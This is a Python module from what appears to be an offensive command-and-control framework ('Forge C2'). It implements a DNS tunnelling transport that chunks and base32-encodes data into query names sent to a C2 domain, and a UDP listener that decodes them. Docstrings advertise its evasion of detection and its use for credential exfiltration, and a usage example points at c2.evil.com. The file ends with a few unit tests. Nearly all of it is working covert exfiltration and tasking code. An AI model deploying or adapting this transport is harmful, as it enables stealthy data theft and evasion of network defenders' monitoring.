"""
Forge C2 — DNS Transport
============================
DNS-based C2 transport — encodes data in DNS queries for stealthy exfil.

Data channels:
    • TXT records: large payloads (base64 in TXT response)
    • A records:   small tasking (4 bytes per query encoded in IP)
    • CNAME:       domain chaining for redirector support
    • AAAA:        IPv6 addresses = 16 bytes per record (chunked)

Wire Format:
    Query:   <data_hex>.<chunk_id>.<beacon_id_short>.c2.example.com
    Response: TXT "<base64_encrypted_task_data>"

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Any

from forge_c2.transport.base_transport import (
    BaseTransport, MalleableProfile, TransportType, get_profile,
)

log = logging.getLogger("forge.c2.transport.dns")


@dataclass
class DNSConfig:
    """DNS transport configuration."""
    domain:         str = "c2.example.com"     # C2 domain
    nameserver:     str = ""                    # Custom NS (empty = system default)
    record_type:    str = "TXT"                # Primary: TXT, A, AAAA, CNAME
    max_label_len:  int = 63                   # DNS label max length
    max_query_len:  int = 253                  # DNS name max length
    chunk_size:     int = 189                  # Bytes per TXT query (~253 hex chars)
    poll_interval:  float = 30.0               # Seconds between DNS polls
    poll_jitter:    float = 10.0               # Jitter on poll interval


class DNSTransport(BaseTransport):
    """DNS C2 transport — hides C2 traffic in DNS queries.

    DNS C2 is slower than HTTP but much harder to detect because:
    - DNS is almost never blocked
    - DNS logs are rarely inspected in real-time
    - Queries blend with legitimate DNS traffic
    - Works through captive portals and restricted networks

    Limitation: low bandwidth (~500 bytes/query for TXT).
    Best for: check-ins, small tasking, credential exfil.
    Use HTTP for large file transfers.

    Usage::

        transport = DNSTransport(config=DNSConfig(domain="c2.evil.com"))
        await transport.connect("c2.evil.com", 53)
        await transport.send(encrypted_payload)
    """

    def __init__(
        self,
        config: DNSConfig | None = None,
        profile: MalleableProfile | None = None,
        role: str = "client",
    ) -> None:
        super().__init__(TransportType.DNS, profile=profile, role=role)
        self.config = config or DNSConfig()
        self._resolver: Any = None
        self._udp_transport: Any = None
        self._recv_queue: asyncio.Queue[bytes] = asyncio.Queue()

    async def connect(self, host: str, port: int = 53, **kwargs: Any) -> bool:
        """Initialize DNS transport.

        Client: sets up DNS resolver.
        Server: opens UDP socket on port 53.
        """
        try:
            if self.role == "server":
                # Server mode: open UDP socket for DNS
                loop = asyncio.get_running_loop()
                transport, _ = await loop.create_datagram_endpoint(
                    lambda: _DNSServerProtocol(self._recv_queue, self),
                    local_addr=(host, port),
                )
                self._udp_transport = transport
                log.info("DNS transport server on %s:%d for domain %s",
                         host, port, self.config.domain)
            else:
                # Client: just store the target
                log.info("DNS transport client targeting %s (ns=%s)",
                         self.config.domain,
                         self.config.nameserver or "system")

            self._connected = True
            self.stats.connections += 1
            return True

        except Exception as exc:
            self.stats.record_error()
            log.error("DNS transport connect failed: %s", exc)
            return False

    async def send(self, data: bytes) -> bool:
        """Encode data in DNS queries.

        Chunks the data into DNS-safe labels and sends as
        sequential DNS queries.
        """
        if not self._connected:
            return False

        try:
            chunks = self._chunk_data(data)
            for i, chunk in enumerate(chunks):
                encoded = base64.b32encode(chunk).decode().rstrip("=").lower()
                # Build DNS query name: <data>.<chunk_id>.<total>.<domain>
                query_name = f"{encoded}.{i}.{len(chunks)}.{self.config.domain}"

                if self.role == "client":
                    await self._send_dns_query(query_name)
                else:
                    # Server mode: we don't send queries, we send responses
                    pass

                self.stats.record_send(len(chunk))

            return True

        except Exception as exc:
            self.stats.record_error()
            log.debug("DNS send error: %s", exc)
            return False

    async def recv(self, timeout: float = 30.0) -> bytes | None:
        """Receive data from DNS responses (client) or queries (server)."""
        try:
            data = await asyncio.wait_for(self._recv_queue.get(), timeout=timeout)
            self.stats.record_recv(len(data))
            return data
        except asyncio.TimeoutError:
            return None
        except Exception as exc:
            self.stats.record_error()
            log.debug("DNS recv error: %s", exc)
            return None

    async def disconnect(self) -> None:
        """Shut down DNS transport."""
        if self._udp_transport:
            self._udp_transport.close()
        self._connected = False
        log.info("DNS transport disconnected")

    # ── DNS encoding helpers ──────────────────────────────────────────

    def _chunk_data(self, data: bytes) -> list[bytes]:
        """Split data into DNS-safe chunks."""
        size = self.config.chunk_size
        return [data[i:i + size] for i in range(0, len(data), size)]

    async def _send_dns_query(self, query_name: str) -> bytes | None:
        """Send a DNS query and get the response.

        Uses system resolver or custom nameserver.
        Falls back to raw UDP if dnspython isn't available.
        """
        try:
            # Try dnspython first
            import dns.resolver
            resolver = dns.resolver.Resolver()
            if self.config.nameserver:
                resolver.nameservers = [self.config.nameserver]

            answers = resolver.resolve(query_name, self.config.record_type)
            for rdata in answers:
                txt = str(rdata).strip('"')
                decoded = base64.b64decode(txt)
                await self._recv_queue.put(decoded)
                return decoded
            return None

        except ImportError:
            # Fallback: raw UDP DNS query
            return await self._raw_dns_query(query_name)

        except Exception as exc:
            log.debug("DNS query failed for %s: %s", query_name, exc)
            return None

    async def _raw_dns_query(self, query_name: str) -> bytes | None:
        """Build and send a raw DNS query over UDP.

        Minimal DNS implementation — no external deps needed.
        """
        try:
            # Build DNS query packet
            txn_id = os.urandom(2)
            flags = b"\x01\x00"        # Standard query, recursion desired
            qdcount = b"\x00\x01"      # One question
            ancount = b"\x00\x00"
            nscount = b"\x00\x00"
            arcount = b"\x00\x00"
            header = txn_id + flags + qdcount + ancount + nscount + arcount

            # Encode question
            question = b""
            for label in query_name.split("."):
                question += bytes([len(label)]) + label.encode()
            question += b"\x00"        # Root label

            # Type TXT (16) or A (1), Class IN (1)
            qtype = b"\x00\x10" if self.config.record_type == "TXT" else b"\x00\x01"
            qclass = b"\x00\x01"
            question += qtype + qclass

            packet = header + question

            # Send via UDP
            ns = self.config.nameserver or "8.8.8.8"
            loop = asyncio.get_running_loop()
            transport, protocol = await loop.create_datagram_endpoint(
                lambda: _DNSClientProtocol(self._recv_queue),
                remote_addr=(ns, 53),
            )

            transport.sendto(packet)

            # Wait for response
            response = await asyncio.wait_for(self._recv_queue.get(), timeout=5.0)
            transport.close()
            return response

        except Exception as exc:
            log.debug("Raw DNS query failed: %s", exc)
            return None


class _DNSClientProtocol(asyncio.DatagramProtocol):
    """Minimal UDP protocol for DNS client queries."""

    def __init__(self, recv_queue: asyncio.Queue[bytes]) -> None:
        self._queue = recv_queue

    def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
        # Extract TXT record data from DNS response (simplified parser)
        try:
            # Skip header (12 bytes) + question section, find answer
            # This is a bare-bones parser — handles simple responses
            if len(data) > 12:
                asyncio.get_event_loop().call_soon_threadsafe(
                    self._queue.put_nowait, data[12:]
                )
        except Exception:
            pass

    def error_received(self, exc: Exception) -> None:
        log.debug("DNS UDP error: %s", exc)


class _DNSServerProtocol(asyncio.DatagramProtocol):
    """UDP protocol for DNS server (listener mode)."""

    def __init__(
        self, recv_queue: asyncio.Queue[bytes], transport_ref: DNSTransport,
    ) -> None:
        self._queue = recv_queue
        self._transport_ref = transport_ref
        self._udp: Any = None

    def connection_made(self, transport: Any) -> None:
        self._udp = transport

    def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
        try:
            # Parse incoming DNS query for C2 data
            if len(data) < 12:
                return

            self._transport_ref.stats.record_recv(len(data))

            # Extract query name from DNS packet
            query_name = self._extract_query_name(data)
            if not query_name:
                return

            # Check if it's a C2 query (ends with our domain)
            if not query_name.endswith(self._transport_ref.config.domain):
                return

            # Extract encoded data from the query name
            labels = query_name.replace(
                f".{self._transport_ref.config.domain}", ""
            ).split(".")

            if len(labels) >= 3:
                encoded_data = labels[0]
                chunk_id = int(labels[1]) if labels[1].isdigit() else 0
                total_chunks = int(labels[2]) if labels[2].isdigit() else 1

                # Decode the data
                padding = "=" * ((8 - len(encoded_data) % 8) % 8)
                decoded = base64.b32decode(encoded_data.upper() + padding)

                asyncio.get_event_loop().call_soon_threadsafe(
                    self._queue.put_nowait, decoded,
                )

        except Exception as exc:
            log.debug("DNS server parse error: %s", exc)

    @staticmethod
    def _extract_query_name(data: bytes) -> str:
        """Extract the query name from a DNS packet."""
        try:
            pos = 12  # Skip header
            labels: list[str] = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                labels.append(data[pos:pos + length].decode(errors="replace"))
                pos += length
            return ".".join(labels)
        except Exception:
            return ""


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestDNSTransport:
    """Tests for DNS transport."""

    def test_init(self) -> None:
        t = DNSTransport()
        assert t.transport_type == TransportType.DNS
        assert t.config.domain == "c2.example.com"

    def test_chunk_data(self) -> None:
        t = DNSTransport(config=DNSConfig(chunk_size=10))
        chunks = t._chunk_data(b"A" * 25)
        assert len(chunks) == 3
        assert len(chunks[0]) == 10
        assert len(chunks[2]) == 5

    def test_config_defaults(self) -> None:
        c = DNSConfig()
        assert c.max_label_len == 63
        assert c.record_type == "TXT"

    def test_extract_query_name(self) -> None:
        # Build a simple DNS query for "test.c2.local"
        packet = bytes(12)  # dummy header
        for label in ["test", "c2", "local"]:
            packet += bytes([len(label)]) + label.encode()
        packet += b"\x00"

        name = _DNSServerProtocol._extract_query_name(packet)
        assert name == "test.c2.local"
